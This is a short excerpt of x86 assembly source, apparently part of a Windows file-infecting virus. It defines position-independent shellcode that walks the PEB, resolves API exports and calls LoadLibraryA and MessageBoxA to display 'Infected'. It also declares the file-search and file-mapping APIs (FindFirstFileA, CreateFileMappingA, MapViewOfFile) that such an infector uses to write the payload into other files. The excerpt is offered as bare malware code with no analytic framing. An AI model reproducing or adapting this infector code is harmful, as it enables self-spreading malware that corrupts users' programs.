glShellCode2 db "\xe5\x8d\x83\xe6\x00\x00\x00\x50\xe8\x48\x00\x00\x00\x8d\x8b"
glShellCode3 db "\xcf\x00\x00\x00\x51\xff\xd0\x8d\x83\xda\x00\x00\x00\x50\xe8"
glShellCode4 db "\x33\x00\x00\x00\x31\xc9\x8d\x8b\xf3\x00\x00\x00\x68\x00\x00"
glShellCode5 db "\x00\x00\x51\x51\x68\x00\x00\x00\x00\xff\xd0\x5d\xc3\x8b\x44"
glShellCode6 db "\x24\x04\x8b\x4c\x24\x08\x8a\x10\x3a\x11\x75\x08\x84\xd2\x74"
glShellCode7 db "\x06\x40\x41\xeb\xf2\x31\xc0\xc2\x08\x00\x53\x64\x8b\x1d\x30"
glShellCode8 db "\x00\x00\x00\x8b\x5b\x0c\x8b\x5b\x1c\xff\x74\x24\x08\x8b\x43"
glShellCode9 db "\x08\x50\xe8\x0c\x00\x00\x00\x85\xc0\x75\x04\x8b\x1b\xeb\xeb"
glShellCode10 db "\x5b\xc2\x04\x00\x8b\x6c\x24\x04\x8b\x45\x3c\x8b\x74\x05\x78"
glShellCode11 db "\x01\xee\xbf\x00\x00\x00\x00\x3b\x7e\x18\x7d\x2e\x8b\x46\x20"
glShellCode12 db "\x01\xe8\x8b\x04\xb8\x01\xe8\xff\x74\x24\x08\x50\xe8\x93\xff"
glShellCode13 db "\xff\xff\x85\xc0\x75\x03\x47\xeb\xe0\x8b\x46\x24\x01\xe8\x0f"
glShellCode14 db "\xb7\x3c\x78\x8b\x46\x1c\x01\xe8\x8b\x04\xb8\x01\xe8\xc2\x08"
glShellCode15 db "\x00\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x4d\x65\x73"
glShellCode16 db "\x73\x61\x67\x65\x42\x6f\x78\x41\x00\x4c\x6f\x61\x64\x4c\x69"
glShellCode17 db "\x62\x72\x61\x72\x79\x41\x00\x49\x6e\x66\x65\x63\x74\x65\x64\x00", 0

DefineFuncNamesAndPointers memset, printf, sprintf, strcat, strlen, UnmapViewOfFile, CloseHandle, FindFirstFileA, FindNextFileA, FindClose, GetSystemDirectoryA, GetFileSize, CreateFileMappingA, MapViewOfFile, memcpy, strcpy, CreateFileA




sc ends

end
